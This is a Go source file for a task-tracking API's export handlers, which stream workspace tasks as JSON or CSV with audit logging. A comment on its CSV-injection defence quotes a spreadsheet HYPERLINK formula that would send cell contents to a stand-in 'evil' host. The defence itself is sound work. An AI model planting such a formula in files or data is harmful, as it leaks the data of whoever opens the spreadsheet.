package export

import (
	"context"
	"database/sql"
	"encoding/csv"
	"fmt"
	"io"
	"iter"
	"log/slog"
	"net/http"
	"strconv"
	"strings"

	"github.com/danielgtaylor/huma/v2"
	"github.com/google/uuid"

	"github.com/libraz/nodate-flow/apps/flow-api/internal/audit"
	"github.com/libraz/nodate-flow/apps/flow-api/internal/db/generated"
	"github.com/libraz/nodate-flow/apps/flow-api/internal/db/types"
	apierrors "github.com/libraz/nodate-flow/apps/flow-api/internal/errors"
	"github.com/libraz/nodate-flow/apps/flow-api/internal/eventbus"
	"github.com/libraz/nodate-flow/apps/flow-api/internal/http/handlers/handlerutil"
	"github.com/libraz/nodate-flow/apps/flow-api/internal/http/middleware"
	"github.com/libraz/nodate-flow/packages/go-shared/apierr"
	"github.com/libraz/nodate-flow/packages/go-shared/logutil"
)

// maxExportRows is the hard upper limit on the number of rows a single
// export request may return. Requests exceeding this threshold receive
// a 422 EXPORT.TASK.TOO_MANY_ROWS error.
const maxExportRows = 10000

// Export handles GET /workspaces/{wsId}/export/tasks.
//
// When format=json, the response is a JSON object with a tasks array.
// When format=csv, the response is a CSV file download with UTF-8 BOM
// for Excel compatibility.
func Export(deps Deps) func(ctx context.Context, in *Input) (*Output, error) {
	return func(ctx context.Context, in *Input) (*Output, error) {
		ws, ok := middleware.WorkspaceFromContext(ctx)
		if !ok {
			return nil, httpErr(apierrors.WsWorkspaceNotFound)
		}
		actorID, _ := middleware.ActorFromContext(ctx)

		limit := in.Limit
		if limit <= 0 {
			limit = 5000
		}
		if limit > maxExportRows {
			limit = maxExportRows
		}

		var data exportDataset
		var err error

		if in.LensID != "" {
			data, err = fetchForLens(ctx, deps, ws, actorID, in.LensID, limit)
		} else {
			data, err = fetchForWorkspace(ctx, deps, ws, actorID, limit)
		}
		if err != nil {
			return nil, err
		}

		tasks := collectTasks(data)

		// Audit log.
		deps.Audit.Record(ctx, audit.Entry{
			Action:       "export.create",
			ActorID:      actorID,
			WorkspaceID:  ws.ID,
			ResourceType: "export",
			Metadata: map[string]any{
				"format": in.Format,
				"count":  len(tasks),
			},
		})

		// Append event.
		actorInt64 := int64(actorID)
		if err := eventbus.Append(ctx, deps.DB, eventbus.Event{
			Type:        eventbus.ExportRequested,
			WorkspaceID: ws.ID,
			ActorUserID: &actorInt64,
			Payload: map[string]any{
				"format": in.Format,
				"count":  len(tasks),
			},
		}); err != nil {
			slog.ErrorContext(ctx, "eventbus.Append failed",
				slog.Any("err", err),
				slog.String("handler", "export.Export"),
				slog.String("event_type", string(eventbus.ExportRequested)),
				logutil.LogEntity("workspace", ws.PublicID),
				slog.String("format", in.Format),
			)
		}

		return &Output{
			Body: Body{
				Format: in.Format,
				Count:  len(tasks),
				Tasks:  tasks,
			},
		}, nil
	}
}

// CSVOperation streams the workspace's tasks as a CSV download.
//
// It is a Huma operation rather than a raw chi handler so the route
// reaches the OpenAPI document and, through it, the generated SDK. As a
// bare chi registration it served the file correctly to anyone who
// already knew the path and was invisible to everyone who did not,
// which is why the JSON route grew a `format` parameter that looked
// like the way to ask for a CSV and was not.
//
// The body is streamed because the payload is a file: Huma marshals a
// declared response body as JSON, so a CSV has to be written directly.
// Errors are returned rather than written, which is what lets Huma emit
// the same problem+json envelope as every other route instead of this
// package hand-rolling one.
func CSVOperation(deps Deps) func(context.Context, *CSVInput) (*huma.StreamResponse, error) {
	return func(ctx context.Context, in *CSVInput) (*huma.StreamResponse, error) {
		ws, ok := middleware.WorkspaceFromContext(ctx)
		if !ok {
			return nil, httpErr(apierrors.WsWorkspaceNotFound)
		}
		actorID, _ := middleware.ActorFromContext(ctx)

		limit := in.Limit
		if limit <= 0 {
			limit = 5000
		}
		if limit > maxExportRows {
			limit = maxExportRows
		}

		var data exportDataset
		var err error
		if in.LensID != "" {
			data, err = fetchForLens(ctx, deps, ws, actorID, in.LensID, limit)
		} else {
			data, err = fetchForWorkspace(ctx, deps, ws, actorID, limit)
		}
		if err != nil {
			return nil, err
		}

		return &huma.StreamResponse{
			Body: func(hctx huma.Context) {
				hctx.SetHeader("Content-Type", "text/csv; charset=utf-8")
				hctx.SetHeader("Content-Disposition", `attachment; filename="tasks-export.csv"`)
				// The row count travels in a header because the body is a
				// file. A caller that wants to know whether the export
				// filled the ceiling it asked for — and is therefore
				// missing rows — cannot get that from the CSV text
				// without parsing it, and counting lines is wrong the
				// moment a description contains a newline. The server
				// already knows the number exactly.
				//
				// It comes from the dataset's own count rather than from
				// counting DTOs, because there is no slice of DTOs to
				// count: the rows are converted as they are written.
				hctx.SetHeader(RowCountHeader, strconv.Itoa(data.count))
				hctx.SetStatus(http.StatusOK)

				res := writeCSV(hctx.BodyWriter(), exportedTasks(data.rows))
				recordExport(ctx, deps, ws, actorID, data.count, res)
				if res.err != nil {
					// The status line went out before the first row did,
					// so there is no status code left to say the file is
					// short. The alternatives are a trailer, which almost
					// no client reads and none of ours do, or ending the
					// chunked stream without terminating it — which every
					// HTTP client reports as a failed transfer and every
					// browser as a failed download. Take the second: a
					// truncated export must not arrive looking whole.
					//
					// net/http treats ErrAbortHandler as "close the
					// connection, log nothing"; the diagnostic is the
					// error record written above.
					panic(http.ErrAbortHandler)
				}
			},
		}, nil
	}
}

// recordExport writes the audit entry and the event for a CSV export
// once the body has been written.
//
// Both are recorded after the fact, not before, because before the write
// the only number available is how many rows the query returned — and
// that is the number this handler used to record unconditionally, so an
// export that reached the caller as twelve rows was logged as five
// thousand. An administrator asking what left the workspace was reading
// the size of a result set, not of a download.
//
// The records are written on a context detached from the request. The
// realistic cause of a failed write is the caller going away, which
// cancels the request context — precisely the case where the audit
// entry matters most, and precisely the case where a request-scoped
// context would refuse to write it.
func recordExport(
	ctx context.Context, deps Deps, ws middleware.WorkspaceContext,
	actorID uint32, selected int, res csvWriteResult,
) {
	meta := exportMetadata(selected, res)

	deps.Audit.Record(context.WithoutCancel(ctx), audit.Entry{
		Action:       "export.create",
		ActorID:      actorID,
		WorkspaceID:  ws.ID,
		ResourceType: "export",
		Metadata:     meta,
	})

	actorInt64 := int64(actorID)
	if err := eventbus.Append(context.WithoutCancel(ctx), deps.DB, eventbus.Event{
		Type:        eventbus.ExportRequested,
		WorkspaceID: ws.ID,
		ActorUserID: &actorInt64,
		Payload:     meta,
	}); err != nil {
		slog.ErrorContext(ctx, "eventbus.Append failed",
			slog.Any("err", err),
			slog.String("handler", "export.CSVOperation"),
			slog.String("event_type", string(eventbus.ExportRequested)),
			logutil.LogEntity("workspace", ws.PublicID),
			slog.String("format", "csv"),
		)
	}

	if res.err != nil {
		slog.ErrorContext(ctx, "export: CSV body write failed",
			slog.Any("err", res.err),
			logutil.LogEntity("workspace", ws.PublicID),
			logutil.LogNumber("rows_selected", selected),
			logutil.LogNumber("rows_written", res.written),
		)
	}
}

// csvWriteResult is what writeCSV observed: the number of task rows it
// handed to the CSV writer, and the error that stopped it.
//
// It is a type rather than two return values so the delivered count and
// the selected count cannot be transposed at the call site. Recording
// the selected count as though it were the delivered one is the exact
// defect this pair exists to prevent, and `len(tasks)` is in scope
// right where the metadata is built.
type csvWriteResult struct {
	written int
	err     error
}

// exportMetadata describes one export for the audit log and the event
// stream.
//
//   - count    — task rows handed to the CSV writer. When the write
//     failed this is an upper bound on what was delivered, not a
//     confirmed count: the writer buffers, so rows counted here can
//     still have been lost in the failing flush.
//   - selected — task rows the query returned. Equal to count on a
//     clean export; larger when the download was cut short.
//   - complete — whether the whole file reached the transport. It is
//     what qualifies count, and without it a short export is
//     indistinguishable from a small workspace.
func exportMetadata(selected int, res csvWriteResult) map[string]any {
	return map[string]any{
		"format":   "csv",
		"count":    res.written,
		"selected": selected,
		"complete": res.err == nil,
	}
}

// writeCSV emits the export as CSV and reports how many task rows it
// got through, along with the first write error that stopped it.
//
// It takes a sequence rather than a slice, and that is the point: a row
// becomes a DTO immediately before it is written and is unreachable
// after, so the export holds one converted row at a time instead of ten
// thousand. Collecting the sequence here — or handing this a slice —
// puts the whole ceiling back in memory and delays the first byte until
// every row has been converted, which is what the caller experiences as
// the download taking a while to start.
//
// Every write is checked. The writer failing means the transport did —
// usually the caller hanging up mid-download. Discarding those errors,
// as this did, produced a short file with a 200 on it and a log entry
// claiming the whole workspace had been exported.
//
// The count is rows handed to the csv.Writer, which buffers: after a
// failing Flush some of the counted rows never reached the socket. It
// is an upper bound on delivery, which is why the caller pairs it with
// the error rather than reporting it alone.
//
// The leading byte order mark is for spreadsheet software that reads a
// CSV as the local code page unless told otherwise; without it a file
// of non-ASCII task titles opens as mojibake. This is the only place
// that adds one — a second BOM written by a client assembling its own
// file would appear as stray characters in the first header cell.
func writeCSV(w io.Writer, tasks iter.Seq[ExportedTask]) csvWriteResult {
	if _, err := w.Write([]byte{0xEF, 0xBB, 0xBF}); err != nil {
		return csvWriteResult{err: fmt.Errorf("export: write byte order mark: %w", err)}
	}

	cw := csv.NewWriter(w)
	write := func(cells []string) error {
		for i, cell := range cells {
			cells[i] = neutraliseFormula(cell)
		}
		return cw.Write(cells)
	}
	if err := write([]string{
		"ID", "Title", "Description", "Status", "Priority",
		"Due Date", "Start Date", "Completed At",
		"Project ID", "Project", "Assignee ID", "Assignee",
		"Updated At", "Created At",
	}); err != nil {
		return csvWriteResult{err: fmt.Errorf("export: write header row: %w", err)}
	}

	written := 0
	var rowErr error
	for t := range tasks {
		if err := write([]string{
			t.ID,
			t.Title,
			handlerutil.DerefStr(t.Description),
			t.Status,
			fmt.Sprintf("%d", t.Priority),
			handlerutil.DerefStr(t.DueOn),
			handlerutil.DerefStr(t.StartedOn),
			handlerutil.FormatOptionalUnixISO(t.CompletedAt),
			t.ProjectID,
			t.ProjectName,
			handlerutil.DerefStr(t.AssigneeID),
			handlerutil.DerefStr(t.AssigneeDisplayName),
			handlerutil.FormatOptionalUnixISO(t.UpdatedAt),
			handlerutil.FormatUnixISO(t.CreatedAt),
		}); err != nil {
			// Breaking out of a range-over-func stops the producer, so
			// the rows behind the failure are never fetched or
			// converted — a caller that hangs up early costs the
			// server the rows it actually read, not the whole ceiling.
			rowErr = fmt.Errorf("export: write row %d: %w", written+1, err)
			break
		}
		written++
	}
	if rowErr != nil {
		return csvWriteResult{written: written, err: rowErr}
	}

	// Flush is where the buffered tail reaches the writer, so it can
	// fail after every Write above succeeded. cw.Error() is the only
	// place that failure is reported — Flush itself returns nothing.
	cw.Flush()
	if err := cw.Error(); err != nil {
		return csvWriteResult{written: written, err: fmt.Errorf("export: flush csv: %w", err)}
	}
	return csvWriteResult{written: written}
}

// ----------------------------------------------------------------
// Internal helpers
// ----------------------------------------------------------------

// formulaLeaders are the characters a spreadsheet reads as "this cell
// is an expression" when it is the first one in the cell.
const formulaLeaders = "=+-@\t\r"

// neutraliseFormula stops a cell from being executed as a formula by
// the program that opens the file.
//
// A task titled `=HYPERLINK("http://evil/?"&A1,"x")` is just a title
// until someone exports the workspace and opens the result in a
// spreadsheet, at which point the title runs and can send the cells
// around it somewhere else (CWE-1236). Anyone who can name a task can
// leave that waiting for whoever exports next, which is usually an
// administrator looking at everything.
//
// Quoting the field does not help, and it is worth saying why, because
// the CSV writer already quotes anything containing a comma or a
// newline and it looks like protection. Quotes are consumed by the
// parser: by the time the spreadsheet decides whether a cell is a
// formula, the value it is looking at starts with the same character
// it always did.
//
// The apostrophe is the mitigation spreadsheets themselves document,
// and it is one ASCII byte a consumer can strip deterministically —
// this repository's own CSV import does. A leading tab would also work
// on Excel, but it is invisible, so a reader cannot tell the value was
// altered, and importers trim leading whitespace inconsistently.
func neutraliseFormula(cell string) string {
	if cell == "" || !strings.ContainsRune(formulaLeaders, rune(cell[0])) {
		return cell
	}
	return "'" + cell
}

// datasetQueryFailed converts a failed export query into the caller's
// error, logging the driver error on the way out.
//
// The typed error deliberately says nothing about what went wrong —
// an export failure must not describe the database to whoever asked
// for the file — so the detail has to be recorded somewhere, or a
// transport-level regression becomes a generic 500 with nothing to
// triage from. The CSV route used to log this and the JSON route did
// not; now both go through here, so both do.
func datasetQueryFailed(ctx context.Context, source string, err error) error {
	slog.ErrorContext(ctx, "export: dataset fetch error",
		slog.String("source", source),
		slog.String("error", err.Error()),
	)
	return httpErr(apierrors.ExportTaskDatasetQueryFailed)
}

// exportRow is an internal union type so both query row types can
// be handled through a single mapper pipeline.
type exportRow struct {
	PublicID            types.PublicID
	Title               string
	Description         sql.NullString
	DerivedState        generated.TasksDerivedState
	Priority            int32
	DueOn               sql.NullTime
	StartedOn           sql.NullTime
	CompletedAt         sql.NullTime
	ProjectPublicID     types.PublicID
	ProjectName         string
	AssigneePublicID    types.PublicID
	AssigneeDisplayName sql.NullString
	UpdatedAt           sql.NullTime
	CreatedAt           sql.NullTime
}

// exportDataset is one export's worth of rows: how many there are, and
// a sequence that yields them.
//
// The rows are a sequence rather than a slice because the CSV route
// writes them out one at a time and never needs two at once. The count
// travels alongside because a sequence cannot be measured without
// consuming it, and both the Row-Count header and the audit record need
// the number before the body is written.
//
// The sequence is re-iterable and reads from memory: the query has
// already returned by the time it exists, so this removes the copies
// layered on top of that result, not the result itself. Streaming from
// the driver would mean a hand-written query outside the generated set.
type exportDataset struct {
	rows  iter.Seq[exportRow]
	count int
}

// collectTasks materialises the whole dataset as DTOs. It is what the
// JSON route needs — the response body is the slice — and the reason
// [exportDataset] does not simply hand back one.
func collectTasks(data exportDataset) []ExportedTask {
	tasks := make([]ExportedTask, 0, data.count)
	for r := range data.rows {
		tasks = append(tasks, mapRow(r))
	}
	return tasks
}

// exportedTasks converts a row sequence to a DTO sequence lazily, one
// row per pull. It is the CSV route's counterpart to [collectTasks].
func exportedTasks(rows iter.Seq[exportRow]) iter.Seq[ExportedTask] {
	return func(yield func(ExportedTask) bool) {
		for r := range rows {
			if !yield(mapRow(r)) {
				return
			}
		}
	}
}

// fetchForWorkspace fetches export rows across the entire workspace.
func fetchForWorkspace(
	ctx context.Context, deps Deps, ws middleware.WorkspaceContext, actorID uint32, limit int32,
) (exportDataset, error) {
	visibility := exportVisibilityParams(actorID, ws.Role)
	dbRows, err := deps.Queries.ExportTasksForWorkspace(ctx, generated.ExportTasksForWorkspaceParams{
		WorkspaceID:   ws.ID,
		IsElevated:    visibility.isElevated,
		ActorUserID:   visibility.actorUserID,
		ActorUserID_2: visibility.actorUserID,
		ActorUserID_3: visibility.actorUserID,
		Limit:         limit,
	})
	if err != nil {
		return exportDataset{}, datasetQueryFailed(ctx, "workspace", err)
	}
	return exportDataset{
		count: len(dbRows),
		rows: func(yield func(exportRow) bool) {
			for _, r := range dbRows {
				if !yield(exportRow{
					PublicID:            r.PublicID,
					Title:               r.Title,
					Description:         r.Description,
					DerivedState:        r.DerivedState,
					Priority:            r.Priority,
					DueOn:               r.DueOn,
					StartedOn:           r.StartedOn,
					CompletedAt:         r.CompletedAt,
					ProjectPublicID:     r.ProjectPublicID,
					ProjectName:         r.ProjectName,
					AssigneePublicID:    r.AssigneePublicID,
					AssigneeDisplayName: r.AssigneeDisplayName,
					UpdatedAt:           r.UpdatedAt,
					CreatedAt:           sql.NullTime{Time: r.CreatedAt, Valid: true},
				}) {
					return
				}
			}
		},
	}, nil
}

// fetchForLens resolves the lens and fetches export rows scoped to its project.
func fetchForLens(
	ctx context.Context, deps Deps, ws middleware.WorkspaceContext, actorID uint32, lensID string, limit int32,
) (exportDataset, error) {
	lid, err := types.Parse(lensID)
	if err != nil {
		return exportDataset{}, httpErr(apierrors.ExportTaskLensNotFound)
	}

	projectID, err := deps.Queries.ResolveLensProjectID(ctx, generated.ResolveLensProjectIDParams{
		WorkspaceID: ws.ID,
		PublicID:    lid,
	})
	if err != nil {
		return exportDataset{}, httpErr(apierr.SpecForErrNoRows(err, apierrors.ExportTaskLensNotFound, apierrors.ExportTaskDatasetQueryFailed))
	}

	// If the lens has a project scope, use the project-scoped query.
	if projectID.Valid {
		visibility := exportVisibilityParams(actorID, ws.Role)
		dbRows, err := deps.Queries.ExportTasksForLens(ctx, generated.ExportTasksForLensParams{
			WorkspaceID:   ws.ID,
			ProjectID:     uint32(projectID.Int32), //#nosec G115 -- project_id is projects.id (BIGINT UNSIGNED), fits uint32 within realistic deployments
			IsElevated:    visibility.isElevated,
			ActorUserID:   visibility.actorUserID,
			ActorUserID_2: visibility.actorUserID,
			ActorUserID_3: visibility.actorUserID,
			Limit:         limit,
		})
		if err != nil {
			return exportDataset{}, datasetQueryFailed(ctx, "lens", err)
		}
		return exportDataset{
			count: len(dbRows),
			rows: func(yield func(exportRow) bool) {
				for _, r := range dbRows {
					if !yield(exportRow{
						PublicID:            r.PublicID,
						Title:               r.Title,
						Description:         r.Description,
						DerivedState:        r.DerivedState,
						Priority:            r.Priority,
						DueOn:               r.DueOn,
						StartedOn:           r.StartedOn,
						CompletedAt:         r.CompletedAt,
						ProjectPublicID:     r.ProjectPublicID,
						ProjectName:         r.ProjectName,
						AssigneePublicID:    r.AssigneePublicID,
						AssigneeDisplayName: r.AssigneeDisplayName,
						UpdatedAt:           r.UpdatedAt,
						CreatedAt:           sql.NullTime{Time: r.CreatedAt, Valid: true},
					}) {
						return
					}
				}
			},
		}, nil
	}

	// Workspace-wide lens: fall back to the workspace query.
	return fetchForWorkspace(ctx, deps, ws, actorID, limit)
}

type exportVisibility struct {
	isElevated  int64
	actorUserID int64
}

func exportVisibilityParams(actorID uint32, wsRole middleware.WorkspaceRole) exportVisibility {
	var elevated int64
	if wsRole.AtLeast(middleware.WorkspaceRoleAdmin) {
		elevated = 1
	}
	return exportVisibility{
		isElevated:  elevated,
		actorUserID: int64(actorID),
	}
}

// mapRow converts one internal exportRow to the public DTO.
// All time/date conversions happen here and nowhere else.
func mapRow(r exportRow) ExportedTask {
	t := ExportedTask{
		ID:          r.PublicID.String(),
		Title:       r.Title,
		Status:      string(r.DerivedState),
		Priority:    r.Priority,
		DueOn:       handlerutil.NullTimeDate(r.DueOn),
		StartedOn:   handlerutil.NullTimeDate(r.StartedOn),
		CompletedAt: handlerutil.NullTimeUnix(r.CompletedAt),
		ProjectID:   r.ProjectPublicID.String(),
		ProjectName: r.ProjectName,
		UpdatedAt:   handlerutil.NullTimeUnix(r.UpdatedAt),
	}
	if r.CreatedAt.Valid {
		t.CreatedAt = r.CreatedAt.Time.Unix()
	}
	if r.Description.Valid {
		t.Description = &r.Description.String
	}
	// A zero UUID means the LEFT JOIN produced NULL (no assignee).
	if r.AssigneePublicID != (types.PublicID{}) && r.AssigneePublicID != types.PublicID(uuid.UUID{}) {
		s := r.AssigneePublicID.String()
		t.AssigneeID = &s
	}
	if r.AssigneeDisplayName.Valid {
		t.AssigneeDisplayName = &r.AssigneeDisplayName.String
	}
	return t
}
